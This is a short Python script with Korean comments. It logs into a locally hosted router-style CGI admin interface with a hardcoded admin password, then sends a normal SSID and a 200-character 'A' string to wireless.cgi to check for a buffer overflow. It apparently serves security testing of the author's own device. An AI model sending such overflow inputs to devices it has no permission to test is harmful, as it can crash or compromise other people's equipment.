import requests

BASE_URL = "http://127.0.0.1:8080/cgi-bin"
USERNAME = "admin"
PASSWORD = "autoEver2026!!"

session = requests.Session()

# 1. 관리자 로그인 및 세션 자동 발급
login = session.post(
    f"{BASE_URL}/login.cgi",
    data={"username": USERNAME, "password": PASSWORD},
    timeout=10
)

if login.status_code != 200 or not login.json().get("ok"):
    print("[FAIL] 관리자 로그인 실패")
    raise SystemExit(1)

print("[SUCCESS] 관리자 로그인 및 GWSESSION 자동 발급")

# 2. 정상 입력 및 Buffer Overflow 검증
tests = [
    ("NORMAL", "TestSSID"),
    ("OVERFLOW_200", "A" * 200)
]

for name, ssid in tests:
    response = session.post(
        f"{BASE_URL}/wireless.cgi",
        data={"w24_ssid": ssid},
        timeout=10
    )

    print(f"\n===== {name} =====")
    print(f"SSID length: {len(ssid)}")
    print(f"HTTP status: {response.status_code}")
    print(f"Response: {response.text[:100]}")
